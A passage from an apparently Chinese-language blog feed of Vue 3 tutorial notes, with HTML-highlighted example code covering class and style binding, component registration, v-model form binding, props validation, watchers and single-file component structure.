class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">           &#125; </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;active&#x27;:isActive,&#x27;text-danger&#x27;:hasError&#125;&quot;</span>&gt;</span>Class样式绑定1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;classObjece&quot;</span>&gt;</span>Class样式绑定2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.active</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.text-danger</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绑定数组"><a href="#绑定数组" class="headerlink" title="绑定数组"></a>绑定数组</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">isActive</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">hasError</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">classObjece</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="attr">active</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">             <span class="string">&#x27;text-danger&#x27;</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">arrActive</span>:<span class="string">&#x27;active&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">arrHasError</span>:<span class="string">&#x27;text-danger&#x27;</span></span></span><br><span class="line"><span class="language-javascript">           &#125; </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;active&#x27;:isActive,&#x27;text-danger&#x27;:hasError&#125;&quot;</span>&gt;</span>Class样式绑定1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;classObjece&quot;</span>&gt;</span>Class样式绑定2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 绑定数组</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;[arrActive,arrHasError]&quot;</span>&gt;</span>Class样式绑定3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.active</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.text-danger</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果你也想在数组中有条件地渲染某个 class，你可以使用三元表达式</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;[isActive ? &#x27;active&#x27; : &#x27;&#x27;]&quot;</span>&gt;</span>Class样式绑定4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="数组和对象"><a href="#数组和对象" class="headerlink" title="数组和对象"></a>数组和对象</h3><p>数组和对象嵌套过程中，只能是数组嵌套对象，不能反其道而行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;[isActive ? &#x27;active&#x27; : &#x27;&#x27;, &#123; &#x27;text-danger&#x27;: hasError &#125;]&quot;</span>&gt;</span>Class样式绑定5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="style绑定"><a href="#style绑定" class="headerlink" title="style绑定"></a>style绑定</h3><p>同理，style也可以类似绑定</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">ColorObjet</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">color</span>:<span class="string">&#x27;red&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">fontSize</span>:<span class="number">60</span>+<span class="string">&#x27;px&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">:style</span>=<span class="string">&quot;ColorObjet&quot;</span>&gt;</span>Style样式绑定1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十七【Vue组件的注册方式】</title>
    <url>/cnblogs.github.io/p/5eff.html</url>
    <content><![CDATA[<p><strong>组件的注册方式</strong><br>一个Vue组件在使用前需要先被“注册”，这样Vue才能在渲染模板时找到其对应的实现。组件注册有两种方式：全局注册和局部注册<br><strong>全局注册</strong></p>
<ul>
<li>main.js</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span><span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span><span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Globalcomponent</span> <span class="keyword">from</span> <span class="string">&quot;./components/Globalcomponent.vue&quot;</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>);</span><br><span class="line">app.<span class="title function_">component</span>(<span class="string">&quot;GlobalComponent&quot;</span>,<span class="title class_">GlobalComponent</span>)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>xx.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>全局应用组件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>局部注册</strong><br>全局注册虽然很方便，但有以下几个问题：</p>
<ul>
<li>全局注册，但并没有被使用的组件无法在生产打包时被自动移除（也叫”tree-shaking”)。如果你全局注册了一个组件，即使它并没有被实际使用，它仍然会出现在打包后的JS文件中</li>
<li>全局注册在大型项目中使项目的依赖关系变得不那么明确。在父组件中使用子组件时，不太容易定位子组件的实现。和使用过多的全局变量一样，这可能会影响应用长期的可维护性</li>
</ul>
<p>局部注册需要使用components选项</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十三【Vue表单输入绑定】</title>
    <url>/cnblogs.github.io/p/97de.html</url>
    <content><![CDATA[<p><strong>表单输入绑定</strong><br>在前端处理表单时，我们常常需要将表单输入框的内容同步给JavaScript 中相应的变量。手动连接值绑定和更改事件监听器可能会很麻烦,v-mode 指令帮我们简化了这一步骤</p>
<h3 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>表单输入绑定<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">checked</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>表单输入绑定<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;agree&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;checked&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;agree&quot;</span>&gt;</span>&#123;&#123; checked &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>v-model也提供了修饰符: .lazy、.number 、.trim默认情况下， v-mode! 会在每次 input 事件后更新数据。你可以添加.lazy 修饰符来改为在每次 change 事件后更新数据</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>表单输入绑定<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入的时候并不能时时显示，失去焦点的时候才会显示</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十九【Vue组件传递Props效验】</title>
    <url>/cnblogs.github.io/p/6e4c.html</url>
    <content><![CDATA[<p><strong>组件传递Props效验</strong><br>Vue组件可以更细致地声明对传入的props的校验要求<br>ComponentA.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentB</span> <span class="keyword">from</span> <span class="string">&#x27;./ComponentB.vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">ComponentB</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">title</span>: <span class="string">&#x27;标题&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentA <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ComponentB</span> <span class="attr">:title</span>=<span class="string">&quot;title&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ComponentB.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">props</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">title</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 效验类型，可以为很多类型</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:[<span class="title class_">String</span>,<span class="title class_">Number</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentB<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>默认值</strong><br>假设ComponentA.vue没有传入age的值：<br>ComponentB.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">props</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">title</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:[<span class="title class_">String</span>,<span class="title class_">Number</span>],</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">age</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:<span class="title class_">Number</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">default</span>:<span class="number">18</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 数字和字符串可以直接default，但是如果是数组和对象，必须通过工厂函数返回默认值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">names</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:<span class="title class_">Array</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">default</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> [<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentB<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in names&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十二【Vue侦听器】</title>
    <url>/cnblogs.github.io/p/ce9f.html</url>
    <content><![CDATA[<p><strong>侦听器</strong><br>我们可以使用watch选项在每次响应式属性发生变化时触发一个函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;<span class="attr">msg</span>:<span class="string">&#x27;Hello&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">changeMsg</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">msg</span>=<span class="string">&#x27;World&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 监听消息变化的函数</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 当消息发生变化时，此函数会被调用</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 函数名必须与要监听的属性名相同</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">msg</span>(<span class="params">newMsg, oldMsg</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 输出新旧消息值，以便在控制台中观察变化</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(newMsg, oldMsg)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>侦听器<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeMsg&quot;</span>&gt;</span>修改数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十五【Vue组件组成】</title>
    <url>/cnblogs.github.io/p/c056.html</url>
    <content><![CDATA[<p><strong>组件组成</strong><br>组件最大的优势就是可复用性<br>当使用构建步骤时，我们一般会将Vue组件定义在一个单独的vue文件中，这被叫做单文件组件(简称SFC)</p>
<h3 id="（1）组件组成结构"><a href="#（1）组件组成结构" class="headerlink" title="（1）组件组成结构"></a>（1）组件组成结构</h3><p>MyComponent.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span>组件基础组成<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 第一步：引入组件</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">MyComponent</span> <span class="keyword">from</span> <span class="string">&#x27;./components/MyComponent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 第二步：注入组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">MyComponent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 第三步：显示组件 --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">MyComponent</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

